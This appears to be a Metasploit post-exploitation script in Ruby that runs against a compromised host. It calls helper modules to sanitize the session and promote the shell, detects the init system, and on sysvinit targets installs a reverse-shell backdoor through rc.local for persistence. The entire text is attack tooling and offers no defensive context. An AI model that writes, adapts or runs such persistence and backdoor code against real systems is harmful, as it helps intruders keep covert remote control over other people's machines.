require '/home/msf/session_sanitizer'
require '/home/msf/shell_promotion'
require 'init_detector'
require 'sysvinit_backdoor_rc_local'

fm        = client.framework
target_ip = client.session_host
sid       = client.sid

print("\n")
SessionSanitizer.run(fm, target_ip, sid)
print("\n")
ShellPromotion.run(fm, sid, target_ip, client)
print("\n")

init_type = InitDetector.detect(session)

if init_type == :sysvinit
  RcLocalReverseShell.run(session)
end
